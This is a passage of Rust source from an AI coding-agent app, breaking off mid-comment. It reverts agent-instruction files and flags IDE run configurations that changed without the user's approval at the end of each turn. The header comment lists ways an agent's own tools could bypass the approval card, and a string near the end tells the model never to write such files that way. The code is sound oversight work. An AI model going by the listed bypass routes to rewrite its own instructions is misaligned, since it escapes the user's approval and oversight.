//! Turn-end backstop for agent-instruction files (user decision 2026-10-24).
//!
//! The main EPS session writes an agent-instruction file
//! ([`crate::fs_tools::is_agent_instruction_path`]) only through
//! `fs_write`/`fs_edit` and the user's 지시 파일 수정 확인 card. A provider's
//! own tools can still reach one: an `Edit` spelled in another case or through
//! an 8.3 short name, a Codex patch to a nested file, a shell command of
//! either CLI. So every turn records what each instruction file looked like
//! when it started ([`Snapshot::capture`], from the real tree, with or
//! without git), and at every exit that commits or settles the turn
//! ([`InstructionGuard::sweep`]) any instruction file that changed without an
//! allowed write is put back: restored to its turn-start bytes, or to the
//! newest content the project settled on since (an allowed write, another
//! session's sweep, a history revert), and deleted when the turn created it.
//! What a revert overwrites or deletes is kept first under
//! [`BACKUP_DIR`]. The turn commit leaves those paths out, and the user and
//! the model are told. A watch-only file
//! ([`crate::fs_tools::is_watch_only_instruction_path`]) that the IDE keeps
//! rewriting is never put back, only kept out of the commits; a change to
//! what it can run is reported even when git ignores the file, since the
//! risk is the IDE running it, not the commit.
//!
//! The scan reads the tree as it is on disk, so a case variant or a short
//! name lands on the one entry it names. It never follows a symlink or
//! junction: a link is recorded as a link, never descended into, and a
//! restore or delete refuses a path whose folders are not plain folders.

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

/// Directory entries one scan visits before it gives up as incomplete.
pub(crate) const SCAN_MAX_ENTRIES: usize = 50_000;
/// The largest instruction file whose bytes a baseline keeps for a restore.
pub(crate) const SNAPSHOT_MAX_FILE_BYTES: u64 = 1024 * 1024;
/// The bytes one baseline keeps in all; files past it are hashed only.
pub(crate) const SNAPSHOT_MAX_TOTAL_BYTES: u64 = 16 * 1024 * 1024;
/// The largest watch-only file ([`crate::fs_tools::is_watch_only_instruction_path`])
/// whose bytes a baseline keeps to compare what it can run, outside
/// [`SNAPSHOT_MAX_TOTAL_BYTES`]; it is also what all of them keep in all.
/// An IDE's workspace file grows past [`SNAPSHOT_MAX_FILE_BYTES`] on its own.
pub(crate) const WATCH_SNAPSHOT_MAX_BYTES: u64 = 16 * 1024 * 1024;
/// Where a revert keeps what it overwrote or deleted, one timestamped folder
/// per sweep. Under `.eud-agent/state/`, which the app's `.gitignore`
/// excludes and `git::dirty_paths` leaves out in any repository; the scan
/// never reads it, so a kept `AGENTS.md` is not itself an instruction file.
pub(crate) const BACKUP_DIR: &str = ".eud-agent/state/instruction-reverted";
/// The largest file a revert keeps a copy of before replacing it; a larger
/// one is left in place and reported.
const BACKUP_MAX_FILE_BYTES: u64 = 16 * 1024 * 1024;
/// How many sweep folders [`BACKUP_DIR`] keeps, newest first.
const BACKUP_KEEP: usize = 20;
/// The age past which a sweep folder is removed even among the newest.
const BACKUP_MAX_AGE_MILLIS: u64 = 14 * 24 * 60 * 60 * 1000;
/// Where the paths held out of every commit ([`held_paths`]) are kept, so a
/// restart keeps holding them. Under `.eud-agent/state/` like the backups.
pub(crate) const HELD_FILE: &str = ".eud-agent/state/instruction-held.json";
/// The largest held-paths file read back.
const HELD_FILE_MAX_BYTES: u64 = 1024 * 1024;
/// The held state of a watch-only path ([`crate::fs_tools::is_watch_only_instruction_path`]):
/// held until it is committed, settled by an allowed write or a revert, or
/// no longer differs from the last commit, however often the IDE rewrites it.
const WATCH_FINGERPRINT: &str = "watch";
/// Where the reports of sweeps that ran after their project closed (or
/// their engine went away) wait for the project's next turn, which tells
/// the user and the model. Under `.eud-agent/state/` like the backups.
pub(crate) const REPORTS_FILE: &str = ".eud-agent/state/instruction-reports.json";
/// The largest reports file read back.
const REPORTS_FILE_MAX_BYTES: u64 = 1024 * 1024;
/// How many waiting reports [`REPORTS_FILE`] keeps, newest last.
const REPORTS_KEEP: usize = 20;
/// How far ahead of the clock a sweep folder's time may be and still count
/// as clock skew: it is kept (outside the newest [`BACKUP_KEEP`]) until then.
const BACKUP_FUTURE_SLACK_MILLIS: u64 = 24 * 60 * 60 * 1000;
/// The components of a JetBrains `.idea/workspace.xml` that can make the IDE
/// run something: run/debug configurations and their before-launch tasks
/// (`RunManager`), startup tasks that run when the project opens
/// (`ProjectStartupLocalConfiguration`/`ProjectStartupSharedConfiguration`),
/// file watchers (`ProjectTasksOptions`), external tools
/// (`ExternalToolsManager`) and Gradle/Maven tasks bound to a sync or a
/// build (`ExternalProjectsManager`). A change anywhere else (window layout,
/// recent files, VCS state) is the IDE's own bookkeeping.
const EXECUTABLE_IDE_COMPONENTS: &[&str] = &[
    "RunManager",
    "ProjectStartupLocalConfiguration",
    "ProjectStartupSharedConfiguration",
    "ProjectTasksOptions",
    "ExternalToolsManager",
    "ExternalProjectsManager",
];
/// The suffix of a restore's same-folder temporary file.
pub(crate) const RESTORE_TEMP_SUFFIX: &str = ".eud-restore";
/// Paths one warning or note names before it counts the rest.
const REPORT_MAX_PATHS: usize = 20;
/// The entries each list of a report kept in [`REPORTS_FILE`] may hold.
const REPORT_MAX_ENTRIES: usize = 64;
/// The longest path (in characters) a report kept in [`REPORTS_FILE`] names.
const REPORT_MAX_PATH_CHARS: usize = 260;
/// The longest reason or error (in characters) a kept report carries.
const REPORT_MAX_REASON_CHARS: usize = 512;
/// The key [`executable_components`] gives a document type declaration: its
/// internal subset can define what the components' entity references say.
const DOCTYPE_COMPONENT: &str = "\0doctype";

/// Whether the scan records `relative`: an instruction path itself, or an
/// instruction folder (whose contents all are).
fn guarded(relative: &str) -> bool {
    crate::fs_tools::is_agent_instruction_path(relative)
        || crate::fs_tools::is_agent_instruction_path(&format!("{relative}/_"))
}

/// Whether `relative` is the guard's own: the backup folder (or anything in
/// it), the held-paths and waiting-reports files (and their temporary
/// files) or a restore's temporary file. Neither the scan nor a commit
/// counts it.
pub(crate) fn is_guard_own_path(relative: &str) -> bool {
    let key = relative.to_ascii_lowercase();
    let backup = BACKUP_DIR.to_ascii_lowercase();
    let own_file = |file: &str| {
        let file = file.to_ascii_lowercase();
        key == file || key.starts_with(&format!("{file}."))
    };
    key == backup
        || key.starts_with(&format!("{backup}/"))
        || own_file(HELD_FILE)
        || own_file(REPORTS_FILE)
        || key
            .rsplit('/')
            .next()
            .is_some_and(|name| name.starts_with('.') && name.ends_with(RESTORE_TEMP_SUFFIX))
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Kind {
    /// A regular file, with its bytes when the baseline kept them.
    File {
        sha256: String,
        bytes: Option<Vec<u8>>,
    },
    Dir,
    /// A symlink or junction, by its target; never followed.
    Link(String),
    /// An entry the scan saw but could not read.
    Unreadable,
}

#[derive(Debug, Clone)]
struct Entry {
    /// The root-relative path as it is spelled on disk.
    relative: String,
    kind: Kind,
}

/// What content an allowed instruction write left in its file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ApprovedContent {
    pub relative: String,
    pub sha256: String,
    /// `None` when the file was too large to keep; a later change to it is
    /// then reported instead of restored.
    pub bytes: Option<Vec<u8>>,
}

impl ApprovedContent {
    /// The content of the file `relative` under `root` right after an
    /// allowed write, or `None` when it cannot be read as a plain file.
    pub(crate) fn read(root: &Path, relative: &str) -> Option<Self> {
        match probe(root, relative, true) {
            Ok(Some(Kind::File { sha256, bytes })) => Some(Self {
                relative: relative.to_string(),
                sha256,
                bytes,
            }),
            _ => None,
        }
    }
}

/// What the project settled on for one instruction path after a given
/// moment: an allowed write's content, what a sweep put back (a restored
/// file or folder, or a deletion), or what a history revert left. Every
/// guard whose baseline is older takes it as the path's target instead of
/// its own baseline, so two overlapping turns never undo each other's
/// sweep.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Settled {
    pub relative: String,
    /// `None` when the path is settled as absent.
    target: Option<Kind>,
}

impl Settled {
    /// The settled bytes of a file, when they were kept.
    #[cfg(test)]
    pub(crate) fn bytes(&self) -> Option<&[u8]> {
        match &self.target {
            Some(Kind::File { bytes, .. }) => bytes.as_deref(),
            _ => None,
        }
    }

    /// Whether the path is settled as absent (a tombstone).
    #[cfg(test)]
    pub(crate) fn is_absent(&self) -> bool {
        self.target.is_none()
    }

    /// `relative` settled as absent.
    #[cfg(test)]
    pub(crate) fn absent(relative: &str) -> Self {
        Self {
            relative: relative.to_string(),
            target: None,
        }
    }
}

impl From<ApprovedContent> for Settled {
    fn from(content: ApprovedContent) -> Self {
        Self {
            relative: content.relative,
            target: Some(Kind::File {
                sha256: content.sha256,
                bytes: content.bytes,
            }),
        }
    }
}

/// The instruction files, folders and links of a project tree at one moment.
#[derive(Debug, Clone)]
pub(crate) struct Snapshot {
    entries: BTreeMap<String, Entry>,
    /// Whether the scan saw the whole tree. A file found later that an
    /// incomplete baseline does not name may have existed all along, so it
    /// is left in place and out of the commit.
    complete: bool,
}

impl Snapshot {
    /// The instruction files of `root` now, with the bytes of every file a
    /// restore may need (within [`SNAPSHOT_MAX_FILE_BYTES`] each and
    /// [`SNAPSHOT_MAX_TOTAL_BYTES`] in all).
    pub(crate) fn capture(root: &Path) -> Self {
        scan(root, true)
    }

    /// The instruction entries of `root` now, hashed only: what a sweep
    /// compares with. Taken outside the project transaction; the sweep
    /// re-reads every path it finds changed inside it.
    pub(crate) fn current(root: &Path) -> Self {
        scan(root, false)
    }
}

/// The bytes one file at `relative` may keep, and what one scan keeps of
/// files like it in all.
fn byte_caps(relative: &str) -> (u64, u64) {
    if crate::fs_tools::is_watch_only_instruction_path(relative) {
        (WATCH_SNAPSHOT_MAX_BYTES, WATCH_SNAPSHOT_MAX_BYTES)
    } else {
        (SNAPSHOT_MAX_FILE_BYTES, SNAPSHOT_MAX_TOTAL_BYTES)
    }
}

fn file_kind(path: &Path, len: u64, keep_bytes: bool, max_file: u64, budget: &mut u64) -> Kind {
    let Ok(mut file) = fs::File::open(path) else {
        return Kind::Unreadable;
    };
    if keep_bytes && len <= max_file && len <= *budget {
        let mut bytes = Vec::with_capacity(len as usize);
        // One byte past the cap tells a file that grew since its metadata.
        if Read::by_ref(&mut file)
            .take(max_file + 1)
            .read_to_end(&mut bytes)
            .is_err()
        {
            return Kind::Unreadable;
        }
        if bytes.len() as u64 <= max_file && bytes.len() as u64 <= *budget {
            *budget = budget.saturating_sub(bytes.len() as u64);
            return Kind::File {
                sha256: format!("{:x}", Sha256::digest(&bytes)),
                bytes: Some(bytes),
            };
        }
        let mut hasher = Sha256::new();
        hasher.update(&bytes);
        return match std::io::copy(&mut file, &mut hasher) {
            Ok(_) => Kind::File {
                sha256: format!("{:x}", hasher.finalize()),
                bytes: None,
            },
            Err(_) => Kind::Unreadable,
        };
    }
    let mut hasher = Sha256::new();
    match std::io::copy(&mut file, &mut hasher) {
        Ok(_) => Kind::File {
            sha256: format!("{:x}", hasher.finalize()),
            bytes: None,
        },
        Err(_) => Kind::Unreadable,
    }
}

fn scan(root: &Path, keep_bytes: bool) -> Snapshot {
    let mut snapshot = Snapshot {
        entries: BTreeMap::new(),
        complete: true,
    };
    let mut budget = SNAPSHOT_MAX_TOTAL_BYTES;
    // Watch-only files keep their bytes apart, so neither crowds out the other.
    let mut watch_budget = WATCH_SNAPSHOT_MAX_BYTES;
    let mut visited = 0usize;
    let mut pending = vec![(root.to_path_buf(), String::new())];
    while let Some((dir, prefix)) = pending.pop() {
        let Ok(children) = fs::read_dir(&dir) else {
            snapshot.complete = false;
            continue;
        };
        for child in children {
            let Ok(child) = child else {
                snapshot.complete = false;
                continue;
            };
            visited += 1;
            if visited > SCAN_MAX_ENTRIES {
                snapshot.complete = false;
                return snapshot;
            }
            let Some(name) = child.file_name().to_str().map(str::to_string) else {
                // Every instruction name is ASCII; only an instruction
                // folder's contents can hide behind a name this cannot spell.
                if !prefix.is_empty() && guarded(&prefix) {
                    snapshot.complete = false;
                }
                continue;
            };
            let relative = if prefix.is_empty() {
                name.clone()
            } else {
                format!("{prefix}/{name}")
            };
            if is_guard_own_path(&relative) {
                continue;
            }
            let path = child.path();
            let Ok(metadata) = fs::symlink_metadata(&path) else {
                if guarded(&relative) {
                    insert(&mut snapshot, relative, Kind::Unreadable);
                }
                continue;
            };
            if metadata.file_type().is_symlink() {
                if guarded(&relative) {
                    insert(&mut snapshot, relative, link_kind(&path));
                }
                continue;
            }
            if metadata.is_dir() {
                if name.eq_ignore_ascii_case(".git") {
                    continue;
                }
                if guarded(&relative) {
                    insert(&mut snapshot, relative.clone(), Kind::Dir);
                }
                pending.push((path, relative));
                continue;
            }
            if guarded(&relative) {
                let kind = if metadata.is_file() {
                    let (max_file, _) = byte_caps(&relative);
                    let budget = if crate::fs_tools::is_watch_only_instruction_path(&relative) {
                        &mut watch_budget
                    } else {
                        &mut budget
                    };
                    file_kind(&path, metadata.len(), keep_bytes, max_file, budget)
                } else {
                    Kind::Unreadable
                };
                insert(&mut snapshot, relative, kind);
            }
        }
    }
    snapshot
}

fn link_kind(path: &Path) -> Kind {
    Kind::Link(
        fs::read_link(path)
            .map(|target| target.to_string_lossy().into_owned())
            .unwrap_or_default(),
    )
}

fn insert(snapshot: &mut Snapshot, relative: String, kind: Kind) {
    snapshot
        .entries
        .insert(crate::git::path_key(&relative), Entry { relative, kind });
}

/// What is at `relative` under `root` now, read directly: `Ok(None)` when
/// nothing is (the path or a folder on the way is missing), an error when a
/// folder on the way is a link or not a folder, or the entry cannot be
/// examined. A file is hashed, with its bytes when `keep_bytes` and it is
/// within its cap ([`SNAPSHOT_MAX_FILE_BYTES`], or
/// [`WATCH_SNAPSHOT_MAX_BYTES`] for a watch-only file).
fn probe(root: &Path, relative: &str, keep_bytes: bool) -> Result<Option<Kind>, String> {
    let path = match safe_path(root, relative, false) {
        Ok(path) => path,
        Err(SafePathError::Missing) => return Ok(None),
        Err(error) => return Err(error.to_string()),
    };
    let metadata = match fs::symlink_metadata(&path) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(error.to_string()),
    };
    if metadata.file_type().is_symlink() {
        return Ok(Some(link_kind(&path)));
    }
    if metadata.is_dir() {
        return Ok(Some(Kind::Dir));
    }
    if !metadata.is_file() {
        return Ok(Some(Kind::Unreadable));
    }
    let (max_file, mut budget) = byte_caps(relative);
    Ok(Some(file_kind(
        &path,
        metadata.len(),
        keep_bytes,
        max_file,
        &mut budget,
    )))
}

fn same(target: Option<&Kind>, now: Option<&Kind>) -> bool {
    match (target, now) {
        (None, None) | (Some(Kind::Dir), Some(Kind::Dir)) => true,
        (Some(Kind::File { sha256: a, .. }), Some(Kind::File { sha256: b, .. })) => a == b,
        (Some(Kind::Link(a)), Some(Kind::Link(b))) => a == b,
        _ => false,
    }
}

/// Why [`safe_path`] refused a path.
#[derive(Debug)]
enum SafePathError {
    /// A folder on the way does not exist (and `create` was not set).
    Missing,
    Refused(String),
}

impl std::fmt::Display for SafePathError {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Missing => formatter.write_str("상위 폴더가 없습니다"),
            Self::Refused(reason) => formatter.write_str(reason),
        }
    }
}

impl From<SafePathError> for String {
    fn from(error: SafePathError) -> Self {
        error.to_string()
    }
}

/// `root` joined with the `/`-separated `relative`, every folder on the way
/// a plain folder (never a link, junction or file); missing ones are created
/// one by one when `create` is set.
fn safe_path(root: &Path, relative: &str, create: bool) -> Result<PathBuf, SafePathError> {
    let parts: Vec<&str> = relative.split('/').collect();
    if parts
        .iter()
        .any(|part| part.is_empty() || *part == "." || *part == "..")
    {
        return Err(SafePathError::Refused(
            "경로가 올바르지 않습니다".to_string(),
        ));
    }
    let mut path = root.to_path_buf();
    for part in &parts[..parts.len() - 1] {
        path.push(part);
        match fs::symlink_metadata(&path) {
            Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {}
            Ok(_) => {
                return Err(SafePathError::Refused(
                    "상위 폴더가 링크이거나 폴더가 아닙니다".to_string(),
                ))
            }
            Err(error) if error.kind() == std::io::ErrorKind::NotFound && create => {
                fs::create_dir(&path).map_err(|error| SafePathError::Refused(error.to_string()))?;
            }
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return Err(SafePathError::Missing)
            }
            Err(error) => return Err(SafePathError::Refused(error.to_string())),
        }
    }
    path.push(parts[parts.len() - 1]);
    Ok(path)
}

/// Check, right before or after a rename or removal at `relative`, that every
/// folder on the way is still a plain folder and the parent still resolves
/// under `root`: a folder swapped for a junction between [`safe_path`] and
/// the operation would otherwise carry it outside the project.
fn verify_parents(root: &Path, relative: &str) -> Result<(), String> {
    let path = safe_path(root, relative, false)?;
    let parent = path
        .parent()
        .ok_or_else(|| "상위 폴더가 없습니다".to_string())?;
    let (Ok(parent), Ok(root)) = (fs::canonicalize(parent), fs::canonicalize(root)) else {
        return Err("상위 폴더를 확인하지 못했습니다".to_string());
    };
    if parent.starts_with(&root) {
        Ok(())
    } else {
        Err("상위 폴더가 프로젝트 밖을 가리킵니다".to_string())
    }
}

/// Run `operation` on `relative`, re-checking the folders on the way right
/// before and right after it. A failed check after the operation is
/// reported: the operation may then have landed somewhere else.
fn checked(
    root: &Path,
    relative: &str,
    operation: impl FnOnce() -> Result<(), String>,
) -> Result<(), String> {
    verify_parents(root, relative)?;
    operation()?;
    verify_parents(root, relative).map_err(|error| {
        format!("작업 직후 상위 폴더가 바뀌어 결과를 확인하지 못했습니다: {error}")
    })
}

/// Where one sweep keeps what it overwrites or deletes: a folder under
/// [`BACKUP_DIR`] made on first use.
struct Backup<'a> {
    root: &'a Path,
    folder: String,
    used: bool,
    /// Whether a revert (not only a watched file's baseline) kept something.
    reverted: bool,
}

impl<'a> Backup<'a> {
    fn new(root: &'a Path) -> Self {
        Self {
            root,
            folder: format!(
                "{BACKUP_DIR}/{}-{}",
                crate::session::now_unix_millis(),
                &uuid::Uuid::new_v4().simple().to_string()[..8]
            ),
            used: false,
            reverted: false,
        }
    }

    /// The name [`Self::new`] gave the folder, without [`BACKUP_DIR`].
    fn name(&self) -> &str {
        self.folder
            .rsplit('/')
            .next()
            .unwrap_or(self.folder.as_str())
    }

    /// Keep `bytes` as `relative` in the folder: what a watched file was at
    /// turn start, which is never put back. Returns the kept copy's path.
    fn keep_bytes(&mut self, relative: &str, bytes: &[u8]) -> Result<String, String> {
        let kept = format!("{}/{relative}", self.folder);
        self.write(&kept, bytes)?;
        Ok(kept)
    }

    fn write(&mut self, kept: &str, bytes: &[u8]) -> Result<(), String> {
        let target = safe_path(self.root, kept, true)?;
        let mut file = fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&target)
            .map_err(|error| error.to_string())?;
        file.write_all(bytes)
            .and_then(|()| file.sync_all())
            .map_err(|error| error.to_string())?;
        self.used = true;
        Ok(())
    }

    /// Keep a copy of what is at `relative` before it is overwritten or
    /// deleted: a file's bytes, or a link's target as `<name>.link`. Nothing
    /// is followed; a file over [`BACKUP_MAX_FILE_BYTES`] or any failure
    /// refuses, and the caller then leaves the path as it is.
    fn keep(&mut self, relative: &str) -> Result<(), String> {
        let source = safe_path(self.root, relative, false)?;
        let metadata = match fs::symlink_metadata(&source) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(error) => return Err(error.to_string()),
        };
        let (name, bytes) = if metadata.file_type().is_symlink() {
            let target = fs::read_link(&source)
                .map(|target| target.to_string_lossy().into_owned())
                .unwrap_or_default();
            (format!("{relative}.link"), target.into_bytes())
        } else if metadata.is_file() {
            if metadata.len() > BACKUP_MAX_FILE_BYTES {
                return Err("파일이 커서 보관하지 못했습니다".to_string());
            }
            let mut bytes = Vec::with_capacity(metadata.len() as usize);
            fs::File::open(&source)
                .and_then(|file| file.take(BACKUP_MAX_FILE_BYTES + 1).read_to_end(&mut bytes))
                .map_err(|error| error.to_string())?;
            if bytes.len() as u64 > BACKUP_MAX_FILE_BYTES {
                return Err("파일이 커서 보관하지 못했습니다".to_string());
            }
            (relative.to_string(), bytes)
        } else {
            return Ok(());
        };
        self.write(&format!("{}/{name}", self.folder), &bytes)?;
        self.reverted = true;
        Ok(())
    }
}

/// Remove the file or link at `relative`, after keeping a copy; a link is
/// removed as a link.
fn delete(root: &Path, relative: &str, backup: &mut Backup) -> Result<(), String> {
    let path = safe_path(root, relative, false)?;
    let metadata = fs::symlink_metadata(&path).map_err(|error| error.to_string())?;
    if !metadata.file_type().is_symlink() && !metadata.is_file() {
        return Err("파일이 아닙니다".to_string());
    }
    backup
        .keep(relative)
        .map_err(|error| format!("지우기 전에 보관하지 못해 그대로 두었습니다: {error}"))?;
    checked(root, relative, || {
        if metadata.file_type().is_symlink() {
            // A directory link or junction is removed with `remove_dir`,
            // which removes the link itself and never what it points at.
            return fs::remove_file(&path)
                .or_else(|_| fs::remove_dir(&path))
                .map_err(|error| error.to_string());
        }
        crate::memory::retry_transient(|| fs::remove_file(&path)).map_err(|error| error.to_string())
    })
}

/// Write `bytes` to `relative` through a same-folder temporary file and a
/// rename, so the file is either the old bytes or the restored ones. What
/// was there is kept first.
fn restore(root: &Path, relative: &str, bytes: &[u8], backup: &mut Backup) -> Result<(), String> {
    let path = safe_path(root, relative, true)?;
    match fs::symlink_metadata(&path) {
        Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {
            return Err("같은 이름의 폴더가 생겼습니다".to_string());
        }
        Ok(metadata) => {
            backup.keep(relative).map_err(|error| {
                format!("덮어쓰기 전에 보관하지 못해 그대로 두었습니다: {error}")
            })?;
            if metadata.file_type().is_symlink() {
                // The link itself goes; its target is never written.
                checked(root, relative, || {
                    fs::remove_file(&path)
                        .or_else(|_| fs::remove_dir(&path))
                        .map_err(|error| error.to_string())
                })?;
            }
        }
        Err(_) => {}
    }
    let parent = path
        .parent()
        .ok_or_else(|| "상위 폴더가 없습니다".to_string())?;
    let name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_default();
    let temp = parent.join(format!(
        ".{name}.{}{RESTORE_TEMP_SUFFIX}",
        uuid::Uuid::new_v4()
    ));
    let written = (|| -> std::io::Result<()> {
        let mut file = fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&temp)?;
        file.write_all(bytes)?;
        file.sync_all()?;
        Ok(())
    })()
    .map_err(|error| error.to_string())
    .and_then(|()| {
        checked(root, relative, || {
            crate::memory::retry_transient(|| fs::rename(&temp, &path))
                .map_err(|error| error.to_string())
        })
    });
    if let Err(error) = written {
        let _ = fs::remove_file(&temp);
        return Err(error);
    }
    Ok(())
}

/// What one sweep put back, could not put back, or could not judge.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub(crate) struct Reverted {
    /// Restored to their turn-start (or newest settled) content, or deleted.
    pub restored: Vec<String>,
    /// Changed without approval but not put back, with why.
    pub failed: Vec<(String, String)>,
    /// Instruction files whose state at turn start (or now) is unknown.
    pub unchecked: Vec<String>,
    /// Watch-only instruction files that changed without approval and
    /// would be committed: left as they are, out of the commit, and told
    /// only when they are also in [`Self::watched_risky`].
    pub watched: Vec<String>,
    /// Watch-only instruction files whose components that can run something
    /// ([`EXECUTABLE_IDE_COMPONENTS`]) changed without approval, each with
    /// where its turn-start bytes were kept (`None` when there were none,
    /// they were not known, or they could not be kept). Told whether or not
    /// a commit would take them: the risk is the IDE running it.
    pub watched_risky: Vec<(String, Option<String>)>,
    /// Those of [`Self::watched_risky`] no commit would take (ignored by git
    /// or back to their committed bytes), so not in [`Self::watched`].
    pub watched_untracked: Vec<String>,
    /// Watch-only instruction files that changed but whose bytes on one side
    /// were too large to keep ([`WATCH_SNAPSHOT_MAX_BYTES`]), so what they
    /// can run was not compared. Told to the user only.
    pub watched_uncompared: Vec<String>,
    /// Whether the end scan could not see the whole tree.
    pub incomplete: bool,
    /// The root-relative folder that keeps what was overwritten, deleted,
    /// or what a watched file was at turn start.
    pub backup: Option<String>,
    /// Whether [`Self::backup`] keeps something a revert overwrote or deleted.
    pub reverted_backup: bool,
    /// Why the sweep itself failed, for a report nobody awaited.
    pub error: Option<String>,
    /// What each restored path now is, for the project's settled record.
    #[serde(skip)]
    settled: Vec<Settled>,
}

impl Reverted {
    /// The report of a sweep that failed with `error`: nothing was checked.
    pub(crate) fn sweep_failed(error: &str) -> Self {
        Self {
            incomplete: true,
            error: Some(error.chars().take(REPORT_MAX_REASON_CHARS).collect()),
            ..Self::default()
        }
    }

    /// Whether there is nothing to tell.
    pub(crate) fn is_empty(&self) -> bool {
        self.restored.is_empty()
            && self.failed.is_empty()
            && self.unchecked.is_empty()
            && self.watched.is_empty()
            && self.watched_risky.is_empty()
            && self.watched_uncompared.is_empty()
            && !self.incomplete
            && self.error.is_none()
    }

    /// Every path the turn commit must leave out.
    pub(crate) fn excluded(&self) -> Vec<String> {
        self.restored
            .iter()
            .chain(self.failed.iter().map(|(path, _)| path))
            .chain(self.unchecked.iter())
            .chain(self.watched.iter())
            .cloned()
            .collect()
    }

    /// The user-facing warning, in Korean, or `None` when nothing happened.
    pub(crate) fn warning(&self) -> Option<String> {
        let mut lines = Vec::new();
        if !self.restored.is_empty() {
            lines.push(format!(
                "승인 없이 바뀐 지시 파일을 되돌렸습니다: {}",
                bounded_list(self.restored.iter().cloned())
            ));
        }
        if !self.failed.is_empty() {
            lines.push(format!(
                "승인 없이 바뀐 지시 파일을 되돌리지 못해 이 턴의 커밋에서 뺐습니다. 직접 확인해 주세요: {}",
                bounded_list(
                    self.failed
                        .iter()
                        .map(|(path, reason)| format!("{path}({reason})"))
                )
            ));
        }
        if !self.unchecked.is_empty() {
            lines.push(format!(
                "턴 시작 때 상태를 모르는 지시 파일이라 그대로 두고 이 턴의 커밋에서 뺐습니다: {}",
                bounded_list(self.unchecked.iter().cloned())
            ));
        }
        if !self.watched_risky.is_empty() {
            let (untracked, held): (Vec<String>, Vec<String>) = self
                .watched_risky
                .iter()
                .map(|(path, _)| path.clone())
                .partition(|path| self.watched_untracked.contains(path));
            if !held.is_empty() {
                lines.push(format!(
                    "IDE 설정 파일의 실행 구성(실행/디버그 구성, 시작 작업, 외부 도구 등)이 승인 없이 바뀌어 커밋에서 뺐습니다. IDE에서 실행하거나 다시 열기 전에 확인해 주세요: {}",
                    bounded_list(held.into_iter())
                ));
            }
            if !untracked.is_empty() {
                lines.push(format!(
                    "IDE 설정 파일의 실행 구성(실행/디버그 구성, 시작 작업, 외부 도구 등)이 승인 없이 바뀌었습니다. git이 커밋하지 않는 파일이라 그대로 두었습니다. IDE에서 실행하거나 다시 열기 전에 확인해 주세요: {}",
                    bounded_list(untracked.into_iter())
                ));
            }
            let unknown: Vec<String> = self
                .watched_risky
                .iter()
                .filter(|(_, kept)| kept.is_none())
                .map(|(path, _)| path.clone())
                .collect();
            if let Some(backup) = self
                .backup
                .as_ref()
                .filter(|_| unknown.len() < self.watched_risky.len())
            {
                lines.push(format!(
                    "바뀌기 전 IDE 설정 파일은 {} 폴더에 보관했습니다.",
                    crate::tool_exec::visible_text(backup)
                ));
            }
            if !unknown.is_empty() {
                lines.push(format!(
                    "바뀌기 전 내용이 없거나 알 수 없어 보관하지 못한 IDE 설정 파일: {}",
                    bounded_list(unknown.into_iter())
                ));
            }
        }
        if !self.watched_uncompared.is_empty() {
            lines.push(format!(
                "IDE 설정 파일이 바뀌었지만 너무 커서 비교하지 못함: 실행 구성이 바뀌었는지 확인하지 못했습니다. IDE에서 실행하거나 다시 열기 전에 확인해 주세요: {}",
                bounded_list(self.watched_uncompared.iter().cloned())
            ));
        }
        if let Some(error) = &self.error {
            lines.push(format!(
                "지시 파일을 확인하지 못했습니다: {}",
                crate::tool_exec::visible_text(error)
            ));
        }
        if self.incomplete {
            lines.push(
                "프로젝트 폴더를 끝까지 읽지 못해 일부 지시 파일은 확인하지 못했습니다."
                    .to_string(),
            );
        }
        if let Some(backup) = self.backup.as_ref().filter(|_| self.reverted_backup) {
            lines.push(format!(
                "되돌리며 덮어쓰거나 지운 내용은 {} 폴더에 보관했습니다.",
                crate::tool_exec::visible_text(backup)
            ));
        }
        (!lines.is_empty()).then(|| lines.join("\n"))
    }

    /// The bounded note the next turn's model receives, or `None` when no
    /// write of the model was put back or left unapproved.
    pub(crate) fn model_note(&self) -> Option<String> {
        if self.restored.is_empty() && self.failed.is_empty() && self.watched_risky.is_empty() {
            return None;
        }
        let mut note = String::from("[instruction files reverted]\n");
        if !self.restored.is_empty() {
            note.push_str(&format!(
                "When the previous turn ended, these agent-instruction files had changed without the user's approval and were restored to their content at the start of that turn (files created during it were deleted): {}.\n",
                bounded_list(self.restored.iter().cloned())
            ));
        }
        if !self.failed.is_empty() {
            note.push_str(&format!(
                "These changed agent-instruction files could not be restored and were left out of the commit: {}.\n",
                bounded_list(self.failed.iter().map(|(path, _)| path.clone()))
            ));
        }
        if !self.watched_risky.is_empty() {
            note.push_str(&format!(
                "These IDE settings files changed a part that can run commands (run/debug configurations, startup tasks, external tools) without the user's approval; they were left as they are (and out of any commit) for the user to check: {}. Never write IDE settings files.\n",
                bounded_list(self.watched_risky.iter().map(|(path, _)| path.clone()))
            ));
        }
        note.push_str(
            "Never write an agent-instruction file with a provider's own file tools or a shell command. If the change is still needed, make it with fs_write or fs_edit so the user can approve it on the card.",
        );
        Some(note)
    }
}

fn bounded_list(paths: impl Iterator<Item = String>) -> String {
    let paths: Vec<String> = paths.collect();
    let shown = paths
        .iter()
        .take(REPORT_MAX_PATHS)
        .map(|path| crate::tool_exec::visible_text(path))
        .collect::<Vec<_>>()
        .join(", ");
    match paths.len().checked_sub(REPORT_MAX_PATHS) {
        Some(rest) if rest > 0 => format!("{shown} 외 {rest}개"),
        _ => shown,
    }
}

/// The [`EXECUTABLE_IDE_COMPONENTS`] of a JetBrains workspace file, each as
